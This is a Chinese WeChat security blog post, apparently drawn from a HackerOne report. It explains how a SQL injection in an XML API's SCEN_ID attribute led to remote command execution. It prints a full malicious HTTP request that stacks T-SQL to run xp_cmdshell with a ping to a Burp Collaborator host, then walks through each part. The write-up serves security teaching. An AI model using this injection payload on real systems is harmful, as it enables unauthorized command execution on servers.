---
title: 由sqli所引起的RCE
url: https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247495493&idx=1&sn=d7f020920c94600cbf7bf7eaa6979657&chksm=e8a5e526dfd26c300839ee00ce8a690e7b309662cbbf86148892802b1ff61f5009ba95d5840e&scene=58&subscene=0#rd
source: 迪哥讲事
date: 2024-08-11
fetch_date: 2025-10-06T18:03:21.117142
---

# 由sqli所引起的RCE

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/YmmVSe19Qj4uR5iaPzBAgQvs9LzYHaRU86lYZ2ibHufennUhbBf2Xoia5mN62KgAicANPoPGWoaUBShz6zsnJfTdug/0?wx_fmt=jpeg)

# 由sqli所引起的RCE

原创

richardo1o1

迪哥讲事

## 正文

### 正常情况下的请求

在正常使用中，API请求旨在合法地交互服务器以获取或更新数据。比如，本案例中，一个正常的API请求可能是查询某个特定场景对象的信息，如：

```
POST  /  HTTP/1.1
Host: contactws.contact-sys.com:3456
Content-Type: application/xml
Content-Length: 185

<REQUEST OBJECT_CLASS="TScenObject" ACTION="ScenObjects" SCEN_ID="123" ExpectSigned="Yes" INT_SOFT_ID="DA61D1CE-757F-44C3-B3F7-11A026C37CD4" POINT_CODE="tzhr" lang="en"></REQUEST>
```

在这个示例中：

SCEN\_ID="123"：请求特定ID为123的场景对象。

ExpectSigned="Yes"：这个标志要求请求应当是签名的，增加了请求的安全性。

INT\_SOFT\_ID：是一个内部软件识别码，用于验证请求来源。

其他参数如POINT\_CODE和lang用于指定更具体的查询需求。

这个请求按照预期功能进行，不涉及任何恶意操作。

受到攻击后的请求

在受到攻击时，如SQL注入，请求会被操纵以执行未经授权的数据库操作。以下是一个受到SQL注入攻击的请求示例：

```
POST  /  HTTP/1.1
Host: contactws.contact-sys.com:3456
Content-Type: application/xml
Content-Length: 342

<REQUEST OBJECT_CLASS="TScenObject" ACTION="ScenObjects" SCEN_ID="33; DECLARE @command varchar(255); SELECT @command='ping yhjbc2mndl88o89il3ueyud7zy5pte.burpcollaborator.net'; EXEC Master.dbo.xp_cmdshell @command; SELECT 1 as 'STEP'" ExpectSigned="No" INT_SOFT_ID="DA61D1CE-757F-44C3-B3F7-11A026C37CD4" POINT_CODE="tzhr" lang="en"></REQUEST>
```

这是一个包含了一个具有SQL注入的XML请求体。这个请求利用了目标API的漏洞来执行远程代码（RCE），即在服务器上运行一个外部命令

`<REQUEST ... >:`这是XML数据的根元素，包含了多个属性，用于定义请求的具体操作和参数。

`OBJECT_CLASS="TScenObject":` 指定请求操作的对象类别，这里是"TScenObject"。

`ACTION="ScenObjects":` 指定要执行的动作，这里是"ScenObjects"，可能是查询或操作场景对象。

`SCEN_ID="...":` 这是关键的注入点。攻击者在这里注入了SQL代码。

`33; DECLARE @command varchar(255); SELECT @command='ping yhjbc2mndl88o89il3ueyud7zy5pte.burpcollaborator.net'; EXEC Master.dbo.xp_cmdshell @command; SELECT 1 as 'STEP':` 这段SQL注入试图做以下几件事：

通过`;`结束前一个SQL语句（如果有）。

使用DECLARE语句声明一个变量`@command`，并将一个ping命令字符串赋值给它。

使用`EXEC Master.dbo.xp_cmdshell @command`执行这个ping命令。xp\_cmdshell是SQL Server的一个扩展存储过程，允许执行操作系统级的命令。这里的ping命令用于发送ICMP包到一个指定的域名，这个域名通常由攻击者控制，用于收集来自被攻击服务器的数据。

最后一个`SELECT 1 as 'STEP'`可能用于保持SQL语法的正确性，确保整个注入代码在语法上是合法的。

`ExpectSigned="No":`表明这个请求不需要数字签名，可能是API设计上的一个安全漏洞，使得未经验证的请求更易被接受。

`INT_SOFT_ID="DA61D1CE-757F-44C3-B3F7-11A026C37CD4":`内部软件标识，用于认证或追踪请求来源。

`POINT_CODE="tzhr", lang="en":` 其他可能用于指定操作或本地化设置的参数。

### 在这个恶意请求中：

SCEN\_ID 被设置为一串SQL注入代码，这些代码不仅试图查询ID为33的场景对象，还试图执行一个远程命令（通过xp\_cmdshell）来发送ping到一个指定的外部服务器（使用Burp Collaborator等工具可以监测到这一ping请求，以此来确认远程代码执行的成功）。

如果你是一个长期主义者，欢迎加入我的知识星球，我们一起往前走，每日都会更新，精细化运营，微信识别二维码付费即可加入，如不满意，72 小时内可在 App 内无条件自助退款

![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5jYW8icFkojHqg2WTWTjAnvcuF7qGrj3JLz1VgSFDDMOx0DbKjsia5ibMpeISsibYJ0ib1d2glMk2hySA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

## 往期回顾

[dom-xss精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247488819&idx=1&sn=5141f88f3e70b9c97e63a4b68689bf6e&chksm=e8a61f50dfd1964692f93412f122087ac160b743b4532ee0c1e42a83039de62825ebbd066a1e&scene=21#wechat_redirect)

[年度精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)

[Nuclei权威指南-如何躺赚](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487122&idx=1&sn=32459310408d126aa43240673b8b0846&chksm=e8a604f1dfd18de737769dd512ad4063a3da328117b8a98c4ca9bc5b48af4dcfa397c667f4e3&scene=21#wechat_redirect)

[漏洞赏金猎人系列-如何测试设置功能IV](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486973&idx=1&sn=6ec419db11ff93d30aa2fbc04d8dbab6&chksm=e8a6079edfd18e88f6236e237837ee0d1101489d52f2abb28532162e2937ec4612f1be52a88f&scene=21#wechat_redirect)

[漏洞赏金猎人系列-如何测试注册功能以及相关Tips](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486764&idx=1&sn=9f78d4c937675d76fb94de20effdeb78&chksm=e8a6074fdfd18e59126990bc3fcae300cdac492b374ad3962926092aa0074c3ee0945a31aa8a&scene=21#wechat_redirect)

## 参考

https://hackerone.com/reports/816254

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4k2mXPm8xlXujVgicTGvZbcictoGLuPERQn9lRPAKkKUB5ut9XMicric8PxLRmSOq0tT5LuGuD1WemBQ/0?wx_fmt=png)

迪哥讲事

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4k2mXPm8xlXujVgicTGvZbcictoGLuPERQn9lRPAKkKUB5ut9XMicric8PxLRmSOq0tT5LuGuD1WemBQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过